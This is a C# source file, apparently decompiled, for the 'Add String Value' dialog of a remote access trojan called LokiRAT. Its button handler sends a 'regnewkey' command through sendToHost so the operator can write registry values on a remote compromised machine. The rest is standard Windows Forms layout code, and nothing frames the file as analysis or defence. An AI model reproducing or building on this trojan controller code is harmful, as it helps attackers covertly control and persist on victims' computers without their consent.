namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class registryNewKey : Form
    {
        private Button button1;
        private IContainer components = null;
        private Label label1;
        private Label label2;
        private TextBox textBox1;
        private TextBox textBox2;

        public registryNewKey()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=regnewkey|" + registry.fullpath + "|" + this.textBox1.Text + "|" + this.textBox2.Text);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.label1 = new Label();
            this.textBox1 = new TextBox();
            this.label2 = new Label();
            this.textBox2 = new TextBox();
            this.button1 = new Button();
            base.SuspendLayout();
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 9);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x44, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "String Name:";
            this.textBox1.Location = new Point(12, 0x19);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(260, 20);
            this.textBox1.TabIndex = 1;
            this.label2.AutoSize = true;
            this.label2.Location = new Point(12, 0x3a);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x43, 13);
            this.label2.TabIndex = 2;
            this.label2.Text = "String Value:";
            this.textBox2.Location = new Point(12, 0x4a);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(260, 20);
            this.textBox2.TabIndex = 3;
            this.button1.Location = new Point(0x97, 0x77);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x79, 0x18);
            this.button1.TabIndex = 4;
            this.button1.Text = "Add String";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x11c, 150);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.textBox2);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.label1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "registryNewKey";
            this.Text = "Add String Value | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

